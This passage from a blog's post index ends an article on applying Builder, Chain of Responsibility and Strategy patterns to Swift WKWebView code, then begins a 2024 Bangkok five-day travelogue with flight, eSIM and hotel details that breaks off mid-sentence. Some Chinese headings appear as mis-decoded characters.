Unable to control WKScriptMessageHandler registration rules. If you need to initialize similar WebViews, you must repeatedly write the injection parameter rules, and the parameter rules cannot be reused. Inside the navigationAction Delegate, the flow is controlled by variables. To delete or change the flow or order, you must modify the entire code, which may break the originally working flow. Builder Pattern Âª∫ÈÄ†ËÄÖÊ®°Âºè Builder Pattern belongs to the creational design patterns. It separates the steps and logic of object creation, allowing the user to set parameters step by step and reuse configurations, ultimately creating the target object. Additionally, the same creation steps can produce different object implementations.The above diagram uses making Pizza as an example. First, the steps to make Pizza are divided into several methods and declared in the PizzaBuilder Protocol (Interface). The ConcretePizzaBuilder is the object that actually makes the Pizza, which could be a Vegetarian PizzaBuilder or a Meat PizzaBuilder. Different Builders may use different ingredients, but they all ultimately build() to produce a Pizza object.WKWebView ScenarioBack to the WKWebView scenario, our final output object is MyWKWebViewConfiguration. We unify all the variables needed for WKWebView settings into this object and use the Builder Pattern MyWKWebViewConfigurator to gradually complete the construction of the Configuration.public struct MyWKWebViewConfiguration { let headNavigationHandler: NavigationActionHandler? let scriptMessageStrategies: [ScriptMessageStrategy] let userScripts: [WKUserScript] let overrideTitleFromWebView: Bool let url: URL}// All parameters are exposed only within the Module (Internal)MyWKWebViewConfigurator (Builder Pattern) Here, since I only need to build for MyWKWebView, I did not further split MyWKWebViewConfigurator into a Protocol (Interface).public final class MyWKWebViewConfigurator { private var headNavigationHandler: NavigationActionHandler? = nil private var overrideTitleFromWebView: Bool = true private var disableZoom: Bool = false private var scriptMessageStrategies: [ScriptMessageStrategy] = [] public init() { } // Parameter encapsulation and internal control public func set(disableZoom: Bool) -&gt; Self { self.disableZoom = disableZoom return self } public func set(overrideTitleFromWebView: Bool) -&gt; Self { self.overrideTitleFromWebView = overrideTitleFromWebView return self } public func set(headNavigationHandler: NavigationActionHandler) -&gt; Self { self.headNavigationHandler = headNavigationHandler return self } // You can encapsulate additional logic rules here public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } public func build(url: URL) -&gt; MyWKWebViewConfiguration { var userScripts:[WKUserScript] = [] // Attach only when generating if disableZoom { let script = \"var meta = document.createElement('meta'); meta.name='viewport'; meta.content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'; document.getElementsByTagName('head')[0].appendChild(meta);\" let disableZoomScript = WKUserScript(source: script, injectionTime: .atDocumentEnd, forMainFrameOnly: true) userScripts.append(disableZoomScript) } return MyWKWebViewConfiguration(headNavigationHandler: headNavigationHandler, scriptMessageStrategies: scriptMessageStrategies, userScripts: userScripts, overrideTitleFromWebView: overrideTitleFromWebView, url: url) }}Adding an extra layer of separation can better utilize Access Control to restrict parameter usage. In this scenario, we want to allow direct injection of WKUserScript into MyWKWebView, but we don‚Äôt want to open it up so much that users can inject scripts arbitrarily. By combining the Builder Pattern with Swift Access Control, once MyWKWebView is placed inside a module, MyWKWebViewConfigurator exposes an operation method func set(disableZoom: Bool) externally. Internally, when creating MyWKWebViewConfiguration, it attaches the WKUserScript. All parameters of MyWKWebViewConfiguration are immutable from outside and can only be generated through MyWKWebViewConfigurator.MyWKWebViewConfigurator + Simple FactoryAfter having the MyWKWebViewConfigurator Builder, we can create a simple factory to encapsulate and reuse the setup process.struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Chain of Responsibility Pattern Ë≤¨‰ªªÈèàÊ®°Âºè The Chain of Responsibility Pattern belongs to behavioral design patterns. It encapsulates object handling operations and links them in a chain structure. Requests are passed along the chain until one handles them. The linked operation encapsulations can be freely combined and reordered. The Chain of Responsibility focuses on whether you need to handle the incoming item; if not, just Skip , so it cannot process partially or modify the input object before passing it to the next. If that is the requirement, then it is another Interceptor Pattern.The above diagram uses Tech Support (or OnCall‚Ä¶) as an example. When an issue arrives, it first goes through CustomerService. If they can‚Äôt handle it, it is passed down to the next level, Supervisor. If still unresolved, it continues down to TechSupport. Additionally, different chains of responsibility can be formed for different issues. For example, problems from major clients may be handled directly starting from Supervisor. The Responder Chain in Swift UIKit also uses the Chain of Responsibility pattern to respond to user actions on the UI.WKWebView ScenarioIn our WKWebView scenario, it is mainly applied in the func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) delegate method. When the system receives a URL request, it passes through this method for us to decide whether to allow navigation, and calls decisionHandler(.allow) or decisionHandler(.cancel) at the end to indicate the result.In the implementation of WKWebView, many conditions arise, or some pages need to be handled differently and bypassed:// Original implementation...func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { guard let url = navigationAction.request.url else { decisionHandler(.allow) return } // Simulate business logic: WebViewController deeplinkCheck == true (means need to check and open page via DeepLinkManager) if deeplinkCheck { print(\"DeepLinkManager.open(\\(url.absoluteString)\") // Simulate DeepLinkManager logic, if URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return // } } // Simulate business logic: WebViewController isHomePage == true (means opening home page) &amp; WebView is browsing home page, then switch TabBar Index if isHomePage { if url.absoluteString == \"https://zhgchg.li\" { print(\"Switch UITabBarController to Index 0\") decisionHandler(.cancel) } } // Simulate business logic: WebViewController noNeedNativePresent == false (means need to match special paths to open native pages) if !noNeedNativePresent { if url.pathComponents.count &gt;= 3 { if url.pathComponents[1] == \"product\" { // match http://zhgchg.li/product/1234 let id = url.pathComponents[2] print(\"Present ProductViewController(\\(id)\") decisionHandler(.cancel) } else if url.pathComponents[1] == \"shop\" { // match http://zhgchg.li/shop/1234 let id = url.pathComponents[2] print(\"Present ShopViewController(\\(id)\") decisionHandler(.cancel) } // more... } } // more... decisionHandler(.allow)}As time goes by, features become more complex, and the logic here increases. If the processing order also needs to change, it will turn into a disaster.NavigationActionHandler (Chain of Responsibility Pattern)First, define the Handler Protocol:public protocol NavigationActionHandler: AnyObject { var nextHandler: NavigationActionHandler? { get set } /// Handles navigation actions for the web view. Returns true if the action was handled, otherwise false. func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool /// Executes the navigation action policy decision. If the current handler does not handle it, the next handler in the chain will be executed. func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void)}public extension NavigationActionHandler { func exeute(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { if !handle(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) { self.nextHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) } }} The operation will be implemented in func handle(). Return true if there are further processes, otherwise return false. func execute() is the default chain access implementation. It traverses the entire operation chain from here. The default behavior is that when func handle() returns false (meaning this node cannot handle it), it automatically calls the next nextHandler‚Äôs execute() to continue processing until the end. Implementation:// Default implementation, usually placed at the endpublic final class DefaultNavigationActionHandler: NavigationActionHandler { public var nextHandler: NavigationActionHandler? public init() { } public func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { decisionHandler(.allow) return true }}//final class PaymentNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // Simulate business logic: Payment related, two-factor verification WebView...etc print(\"Present Payment Verify View Controller\") decisionHandler(.cancel) return true }}//final class DeeplinkManagerNavigationActionHandler: NavigationActionHandler { var nextHandler: NavigationActionHandler? func handle(webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; Bool { guard let url = navigationAction.request.url else { return false } // Simulate DeepLinkManager logic, if URL can be opened successfully, open it and end the process. // if DeepLinkManager.open(url) == true { decisionHandler(.cancel) return true // } else { return false // }}// More...Usage:extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { let headNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() let paymentNavigationActionHandler = PaymentNavigationActionHandler() headNavigationActionHandler.nextHandler = paymentNavigationActionHandler paymentNavigationActionHandler.nextHandler = defaultNavigationActionHandler headNavigationActionHandler.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) }}This way, when a request is received, it will be processed sequentially according to the handler chain we defined.Combine with the previous Builder Pattern MyWKWebViewConfigurator by making headNavigationActionHandler a parameter, allowing external control over the WKWebView‚Äôs handling requirements and order:extension MyWKWebViewController: WKNavigationDelegate { public func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) { configuration.headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) ?? decisionHandler(.allow) }}//...struct MyWKWebViewConfiguratorFactory { enum ForType { case `default` case productPage case payment } static func make(for type: ForType) -&gt; MyWKWebViewConfigurator { switch type { case .default: // Simulate default case with these handlers let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let homePageTabSwitchNavigationActionHandler = HomePageTabSwitchNavigationActionHandler() let nativeViewControllerNavigationActionHandlera = NativeViewControllerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() deplinkManagerNavigationActionHandler.nextHandler = homePageTabSwitchNavigationActionHandler homePageTabSwitchNavigationActionHandler.nextHandler = nativeViewControllerNavigationActionHandlera nativeViewControllerNavigationActionHandlera.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator() .add(scriptMessageStrategy: PageScriptMessageStrategy()) .add(scriptMessageStrategy: UserScriptMessageStrategy()) .set(headNavigationHandler: deplinkManagerNavigationActionHandler) .set(overrideTitleFromWebView: false) .set(disableZoom: false) case .productPage: return Self.make(for: .default).set(disableZoom: true).set(overrideTitleFromWebView: true) case .payment: // Simulate payment page only needs these handlers, with paymentNavigationActionHandler having highest priority let paymentNavigationActionHandler = PaymentNavigationActionHandler() let deplinkManagerNavigationActionHandler = DeeplinkManagerNavigationActionHandler() let defaultNavigationActionHandler = DefaultNavigationActionHandler() paymentNavigationActionHandler.nextHandler = deplinkManagerNavigationActionHandler deplinkManagerNavigationActionHandler.nextHandler = defaultNavigationActionHandler return MyWKWebViewConfigurator().set(headNavigationHandler: paymentNavigationActionHandler) } }}Strategy Pattern Á≠ñÁï•Ê®°Âºè The Strategy Pattern is part of behavioral design patterns. It abstracts the actual operations, enabling the implementation of multiple operations that can be flexibly swapped according to different scenarios.The above diagram uses different payment methods as examples. We abstract payment as a Payment Protocol (Interface), then each payment method implements its own version. In PaymentContext (simulating external use), the corresponding Payment instance is created based on the user‚Äôs chosen payment method, and pay() is called uniformly to process the payment.WKWebView Scenario Used in interaction between WebView and frontend pages. When the frontend JavaScript calls: window.webkit.messageHandlers.Name.postMessage(Parameters); It will enter WKWebView to find the corresponding WKScriptMessageHandler class with the given Name and execute the operation.The system already defines the Protocol and the corresponding func add(_ scriptMessageHandler: any WKScriptMessageHandler, name: String) method. We only need to implement our own WKScriptMessageHandler and add it to the WKWebView. The system will then dispatch to the appropriate concrete strategy based on the received name, following the Strategy Pattern.Here is a simple Protocol extension of WKScriptMessageHandler with an additional identifier:String for add(.. name:) usage:public protocol ScriptMessageStrategy: NSObject, WKScriptMessageHandler { static var identifier: String { get }}Implementation:final class PageScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"page\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // Simulate called from js: window.webkit.messageHandlers.page.postMessage(\"Close\"); print(\"\\(Self.identifier): \\(message.body)\") }}//final class UserScriptMessageStrategy: NSObject, ScriptMessageStrategy { static var identifier: String = \"user\" func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) { // Simulate called from js: window.webkit.messageHandlers.user.postMessage(\"Hello\"); print(\"\\(Self.identifier): \\(message.body)\") }}WKWebView Registration Usage:var scriptMessageStrategies: [ScriptMessageStrategy] = []scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier)}Combining with the previous Builder Pattern MyWKWebViewConfigurator manages the registration of ScriptMessageStrategy from outside:public final class MyWKWebViewConfigurator { //... // You can encapsulate additional logic rules here public func add(scriptMessageStrategy: ScriptMessageStrategy) -&gt; Self { // Here, the logic is to remove the old one first if there is a duplicate identifier scriptMessageStrategies.removeAll(where: { type(of: $0).identifier == type(of: scriptMessageStrategy).identifier }) scriptMessageStrategies.append(scriptMessageStrategy) return self } //...}//...public class MyWKWebViewController: UIViewController { //... public override func viewDidLoad() { super.viewDidLoad() //... configuration.scriptMessageStrategies.forEach { scriptMessageStrategy in webView.configuration.userContentController.add(scriptMessageStrategy, name: type(of: scriptMessageStrategy).identifier) } //... }}Question: Can this scenario also be implemented using the Chain of Responsibility Pattern?At this point, some may ask if the Strategy Pattern here can be replaced by the Chain of Responsibility Pattern? These two design patterns are both behavioral and can be interchangeable; however, the choice depends on the specific scenario. Here, it is a typical Strategy Pattern where WKWebView selects different strategies based on the Name. If the requirement involves chained dependencies or recovery relationships between strategies‚Äîfor example, if AStrategy does not handle it and passes it to BStrategy‚Äîthen the Chain of Responsibility Pattern should be considered.Strategy vs. Chain of Responsibility Strategy Pattern: There is a clear dispatch execution strategy, and the strategies are independent of each other. Chain of Responsibility Pattern: The execution strategy is determined within each implementation. If it cannot handle the request, it passes it to the next implementation. Complex scenarios can be achieved by applying the Chain of Responsibility Pattern within the Strategy Pattern.Final Combination Simple Factory Pattern MyWKWebViewConfiguratorFactory -&gt; Encapsulates the creation process of MyWKWebViewConfigurator Builder Pattern MyWKWebViewConfigurator -&gt; Encapsulates MyWKWebViewConfiguration parameters and build steps MyWKWebViewConfiguration Injection -&gt; Used by MyWKWebViewController Chain of Responsibility Pattern MyWKWebViewController‚Äôs func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -&gt; Void) -&gt; calls headNavigationHandler?.exeute(webView: webView, decidePolicyFor: navigationAction, decisionHandler: decisionHandler) to execute the chain processing Strategy Pattern MyWKWebViewController uses webView.configuration.userContentController.addUserScript(XXX) to dispatch corresponding JS Callers to the appropriate handling strategies Complete Demo RepoFurther Reading Practical Application of Design Patterns Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableView If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Bangkok Travel GuideÔΩú5-Day Independent Trip Highlights in Thailand", "url": "/posts/travel-journals/bangkok-travel-guide-5-day-independent-trip-highlights-in-thailand-b7e7c0938985/", "categories": "Travel Journals", "tags": "english, ai-translation, life, travel, travel-writing, bangkok, thailand", "date": "2024-08-25 01:23:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 Thailand Bangkok üáπüá≠ 5-Day Independent TripPost-pandemic revi...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off![Travelogue] 2024 Thailand Bangkok üáπüá≠ 5-Day Independent TripPost-pandemic revisit to Thailand: A five-day quick trip to Bangkok.Memories of BangkokBack in 2018, my first company trip during my first job was also my first time traveling abroad, a 5-day trip to Bangkok and Hua Hin, Thailand. The following year, 2019, I went on another company trip to Sabah. Then came the two years lost to the pandemic. After the pandemic ended, I started going crazy over independent trips to Japan.At that time, I was a total rookie with zero social experience, cluelessly following my older brother and sister. I didn‚Äôt even know what was allowed on the plane. During security check, I foolishly put my passport on top of the basket, and when it came out of the machine, I realized it had fallen on the conveyor belt, nearly panicking (if it had fallen into the gap, I wouldn‚Äôt have been able to get it back). That trip was just blindly joining a tour group and riding the bus without thinking. My impression of Bangkok was vague‚ÄîI only remembered the rooftop bar was great, the weather was hot, things were cheap, and massages were affordable. I had no idea about the geography at all.Therefore, I always wanted to revisit Bangkok to refresh my memories from six years ago; however, being unfamiliar with Southeast Asia, I was hesitant to travel alone. At the beginning of the year, while chatting with Pinkoi colleagues, we decided to organize this five-day independent trip to Bangkok. The detailed itinerary and memories of the 2018 five-day trip to Bangkok and Hua Hin are included in the appendix at the end of the article.Ready!üëâüëâüëâKKday Recommended Plans: Chao Phraya Princess Cruise Dinner BuffetÔΩúChao Phraya Princess River Cruise Bangkok Classic One-Day Tour | Maeklong Railway and Damnoen Saduak Floating Market | Departure from Bangkok [Thailand] Half-Day Private Tour in BangkokÔΩúMaeklong Railway Market ‚Äî Amphawa Floating Market ‚Äî Amphawa Firefly Night Cruise King Power Mahanakhon SkyWalk Bangkok Ticket Thailand Airport BKK Departure Meet and Greet Fast VIP Service Thailand SIM CardÔΩúAIS 5G High-Speed Network 8 Days Unlimited Data + Calls eSIM ThailandÔΩúAirport Private TransferÔΩúSuvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) ‚Äî Bangkok/Pattaya/Hua Hin City Hotels Bangkok Airport Transfer | Private Car from Bangkok City to Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) ‚Äî ‚Äî ‚ÄîSince I started a new job in June, I haven‚Äôt had much time for leisure. Mark and Sean mainly handled the arrangements and planning, so I didn‚Äôt do much research. ‚ö†Ô∏è‚ö†Ô∏è‚ö†Ô∏èThailand Bangkok Travel Safety and Precautions are placed after the travelogue. You may skip the travelogue but must read the scam warnings, precautions, and important notes if you plan to try cannabis.Schedule 2024/08/02 ~ 2024/08/06 Day 1 08/02: Estimated arrival at Bangkok airport at 18:45, arrive at the hotel around 20:00, then rest at the hotel or visit the hotel bar. Day 2 08/03: Attractions along the Chao Phraya River, including the Grand Palace, Wat Pho, Wat Phra Kaew, Wat Arun, ICONSIAM. In the evening, meet with former Digital Economy leader (now Agoda) Chun-Hsiu Liu and Lhao Lhao for dinner and listen to Rock Pub Live. Day 3 08/04: Chatuchak Market, King Power Mahanakhon Building, Jodd Fairs Night Market (Volcano Ribs) Day 4 08/05: Shopping at Central World and Terminal 21 Day 5 08/06: Return trip, 15:20 flight NetworkThis time, the preparation was rushed. The internet wasn‚Äôt set up until the day before, and there was no time to buy my usual physical SIM card. Fortunately, I tried eSIM for the first time. (Loved it after using it)Buy directly from KKday Thailand SIM CardÔΩúAIS 5G High-Speed Network 8 Days Unlimited Data + Calls eSIM. After purchase, you will immediately receive the eSIM activation voucher and can start using it right away.Thailand SIM CardÔΩúAIS 5G High-Speed Network 8 Days Unlimited Data + Calls eSIM Limited Time Offer: From now until December 31, 2024, activate during the promotion period to enjoy doubled high-speed data from 15GB to 30GB. After exceeding 30GB, speed will be reduced to 384 Kbps without disconnection. AIS unlimited on-net calls, 50 THB call credit, and an additional 10GB (10Mbps) data for messaging apps: Tiktok, Wechat, and Instagram. Has a physical number, supports calls, and receives SMS! Calculation method for days: 24-hour system, starting from the activation of the eSIM, with 24 hours counted as one day (Thailand time). Mainly unlimited data, cheaper than physical SIM cards, 8 days for NT $232.Flight Tickets üõ´ Outbound: TPE 16:00 -&gt; BKK 18:45 Return: BKK 15:20 -&gt; TPE 20:10 Airline: Thai VietJet Air (Low-cost carrier)Price: TWD $9,259 (includes additional round-trip 15 kg checked baggage)At first, I thought about traveling with everyone. My friend didn‚Äôt check in luggage (the ticket price was about $6,000), but after checking other airlines, I felt like I missed out; other airlines at similar times cost around $10,000, not much difference, but much more comfortable!Thai VietJet Air‚Äôs baggage policy actually allows you to avoid checked baggage. You can carry two pieces of hand luggage with a total weight not exceeding 7 kg.1. Carry-on luggage weight:Each passenger (except infants) can bring 1 piece of personal luggage and 1 small carry-on bag, with a maximum total weight of 7 kg.2. Carry-on luggage size:- 1 piece of carry-on luggage with maximum dimensions of 56cm x 36cm x 23cm- 1 small carry-on bag (including the following bags) + 1 bag for girls, magazines, camera, baby food bag, airport-purchased bags not exceeding 30cm x 20cm x 10cm, etc. + 1 bag for a coat, which when opened must not exceed 114cm x 60cm x 11cm + 1 bag for a laptop with maximum dimensions of 40cm x 30cm x 10cm Excerpted from information as of 2024/08/22, subject to the latest official announcements.Basically, just carry a backpack and pull a carry-on suitcase.8/1 Flight Change NoticeReceived a flight change notification after 11 PM on 8/1. The schedule was changed to depart at 16:35 and arrive at 19:20.AccommodationJC KEVIN SATHORN BANGKOK HOTEL Bangkok JC Kevin Sathorn Hotel Five-Star Apartment Hotel36 Narathiwas-Ratchanakarin Road, Yannawa, Sathorn, Bangkok, Sathon, Bangkok, Bangkok, Thailand, 10120 Room type: Skyline 2-Bedroom Suite with Balcony, with an unboxing video following. Transportation: According to the map, the nearest BTS Chong Nonsi station is about 1 km away, approximately a 15-minute walk. Price: NT 31,315 / 4 people / 4 nights. (It‚Äôs expensive because of late booking; earlier bookings can get 40‚Äì50% off) CurrencyMy travel companion exchanged 3,000 THB in advance, while I exchanged money at SuperRich after arriving.TransportationIn Taiwan, register for Grab in advance and link your credit card for easy use.Taiwanese SouvenirsPreparing Taiwanese-flavored souvenirs for Agoda‚Äôs top seller. HeySong Sarsaparilla, Mai Xiang Milk Tea, Vita Lemon Tea, I-Mei Cream Puffs, Shrimp Chips, Wei Lih Instant Noodles with Soybean Paste, Pineapple Cake, Potato Chips with Oyster Omelette Flavor, Cola Crackers, Green Kuai Kuai SnacksHong Kong‚Äôs Party Room / BBQ Venue Platform ‚Äî Common Room Booking PlatformBefore starting the travelogue, let me introduce a newly launched booking platform in Hong Kong for daily/hourly rental hotels, Party Room suites, and yacht parties ‚Äî Common Room.Common RoomWhether you want to find a party room to celebrate or rent a hotel/guesthouse for a short stay, you can easily use the Common Room platform to find your ideal venue!You can now also book the ferry to Hong Kong.For friends planning to travel to Hong Kong and wanting to try different venues, you can check it out immediately: Common Room Booking Platform .8/02 Day 1 DepartureAround 12:30 PM, leave home after work Remember to take the Airport Express direct train; even if the regular train is earlier in the morning, it won‚Äôt arrive before the direct train!Around 13:30 Arrive at Taoyuan Airport Terminal 1The check-in counter was completely empty. Upon arrival, I checked in and completed the baggage drop-off immediately.B1R again, the gate at the farthest corner + requires a shuttle bus.It‚Äôs still early before 4 PM, so once again, I came to eat Yi Hang Ding Gua Gua. This time, I found out you can order Gua Gua buns separately, which used to sell only fried chicken!I just found out that if you walk straight ahead from Ding Gua Gua, you can reach Terminal 2. So if you have plenty of time, you can go to Terminal 2 to eat; or you can come from Terminal 2 to Terminal 1 to use the free VIP lounge for a rest XDAfter buying Ding Gua Gua, I went to the Terminal 1 free VIP lounge to sit, rest, and eat. This time, I saw someone charging their device. Last time I came, all the outlets were removed; it seems they have been fixed (?).Around 15:30, head to B1R waiting loungeNot sure if it‚Äôs because of the low-cost airline, but the information hasn‚Äôt been updated (it kept showing 16:00, but the actual time changed to 16:35).With the flight delayed again, the actual departure time was 17:13. VietJet‚Äôs seats are about the same size as Tigerair‚Äôs, both larger than Peach‚Äôs. However, the seats are uncomfortable, the leather material is not breathable, and sitting for a long time causes pain. VietJet should allow bringing your own food. On the return flight, someone ate mango sticky rice they bought without any issues. 19:30 Arrive at Bangkok BKK Suvarnabhumi AirportI heard from colleagues that if you arrive at Bangkok airport during peak hours, you can purchase the Thailand Airport BKK Departure Meet and Greet Fast Track VIP Service to use the fast lane XD. However, we arrived at a time when almost only passengers from our flight were there, so the clearance was very quick.20:00 Collect luggage and exit the airportMaybe because it‚Äôs a low-cost airline, few people checked in luggage, so baggage claim was super fast.eSIM Network SettingsAs soon as I left the airport and started figuring out how to set up and activate the eSIM, I realized‚Ä¶ ‚ö†Ô∏è Activating eSIM requires an internet connection ‚ö†Ô∏è ‚ö†Ô∏èActivating eSIM requires an internet connection‚ö†Ô∏è ‚ö†Ô∏èeSIM activation requires an internet connection‚ö†Ô∏èIt‚Äôs like buying a pair of scissors but needing another pair to cut it open. Activating eSIM requires an internet connection first; luckily, my friend who traveled with me had already activated their eSIM in Taiwan, so I used their network to activate mine. (There is also Wi-Fi available at the airport, so no need to worry too much.)To activate eSIM, simply long-press the QR code and select Add eSIM. For some reason, if you save the QR code to Photos or Notes, the quick add feature stops working. Another way is to send the QR code to your companion or print it out for the phone to scan.iPhone iOS eSIM Manual Setup Path: Settings -&gt; Cellular -&gt; Add eSIM -&gt; Scan QR Code -&gt; Enter Information Manually -&gt; Input Details from Email -&gt; Use As‚Ä¶ You can select ‚ÄúTravel‚Äù -&gt; Choose ‚ÄúTravel‚Äù for Cellular Data -&gt; Done!After activation, it works like dual SIM dual standby. However, before purchasing a roaming plan for the original SIM card, there is no internet. In emergencies, you can still switch back to the original SIM card! AIS phone number inquiry dial 545#, balance inquiry dial *121#, data usage inquiry dial *1213#20:30 Finding Food at the AirportSince it takes over an hour to get to the city and hotel, and the low-cost airline doesn‚Äôt provide meals, everyone was starving, so we looked for food at the airport for dinner first.Found a Thai restaurant to eat at. The spicy minced pork is really hot and satisfying, and pairing it with vegetable soup helps ease the spiciness.21:00 Move to the hotel üëâüëâüëâYou can refer to KKday airport transfer services: - ThailandÔΩúAirport Private TransferÔΩúSuvarnabhumi Airport (BKK) / Don Mueang Airport (DMK) ‚Äî Bangkok/Pattaya/Hua Hin City Hotels - Bangkok Airport TransferÔΩúPrivate Car from Bangkok City to Suvarnabhumi Airport (BKK) / Don Mueang Airport (DMK)After eating around 21:00, start heading towards the city center and the hotel.Taking public transportation requires three transfers between the subway and BTS: Airport Rail Link Suvarnabhumi -&gt; Phaya Thai BTS Sukhumvit Line Phaya Thai -&gt; Siam BTS Silom Line Siam -&gt; Chong Nonsi Airport Express tickets can only be purchased. BTS cards can be reloaded and used for entry and exit at ticket counters. Please note that the Rabbit Card can only be used on BTS, and cannot be used on MRT or the Airport Rail Link. Arrived at Chong Nonsi (Later found out that King Power Mahanakhon Building is at this station!)Walk to JC KEVIN SATHORN BANGKOK HOTEL ÊõºË∞∑JC ÂáØÊñáÊ≤ôÂêûÈÖíÂ∫óWhen exiting BTS, don‚Äôt rush to go down the overpass; you can walk across the street using the overpass. The path was quite dark (not many streetlights), and it was a bit far to walk (15 mins / 1 KM). Walking alone at night could be scary. Along the way, I passed a 7‚Äì11 and a small night market. I bought some food at 7‚Äì11 to bring back to the hotel. Also, if taking a taxi, because of the two-way road and U-turn restrictions, the driver must pass the hotel a short distance to the next gap before turning back, which is somewhat inconvenient.10:30 JC KEVIN SATHORN BANGKOK HOTEL Bangkok JC Kevin Sathorn HotelArrived at the hotel around 10:30.The room is very spacious, a full apartment-style unit with a master bedroom, a second bedroom, two bathrooms, a kitchen, a living room, and a balcony.2018 MemoriesShot in 2018 / iPhone 6What a coincidence! Back in 2018, during a company group tour to Bangkok, we all took taxis at night to this rooftop bar, which is actually the bar of this hotel XDAdditionally, it also offers a Sky Bar dinner package: Bangkok Sathorn JC Kevin Hotel Zoom Sky Bar Dinner20242024 / iPhone 15 ProSince we were staying here this time, we went upstairs to take a look after putting our luggage in the room.Since it was already past dinner time, we could only order some snacks and grilled skewers.8/03 Day 2 Wat Pho, Grand Palace, Wat Phra Kaew, Wat Arun, ICONSIAM, Lhao Lhao, Rock Pub LiveHotel BreakfastAfter having breakfast at the hotel in the morning, we went out. I thought the breakfast was okay, but there weren‚Äôt many choices.9:30 DepartureBecause there were many people, we took a Grab (THB 135) directly to Wat Pho.Photo by Florian WehdeOn the way, we passed through Chinatown, but forgot to take photos. It had a strong cyberpunk vibe! üëâüëâüëâ You can also consider KKday‚Äôs: Bangkok Private Day Tour: Wat Pho, Wat Arun, Grand Palace, Emerald Buddha Temple, Thailand.Wat PhoTicket price: THB 300 per person.The colorful stupa in the Reclining Buddha Temple has an indescribable sense of grandeur. Last time in Kyushu, Japan, I also visited the Nanzoin Temple to see the Reclining Buddha. This time, I came to see the Reclining Buddha in Thailand. ‚ö†Ô∏è Crowded places, beware of pickpockets ‚ö†Ô∏èEntering requires removing shoes. You can walk around the Reclining Buddha at Wat Pho for worship.SuperRich Currency ExchangeAfter leaving Wat Pho, we decided to handle currency exchange first. Only one friend had exchanged some Thai Baht in advance; the rest planned to exchange money in Bangkok. So, we went to the nearby The Old Siam Shopping Plaza‚Å© and used the 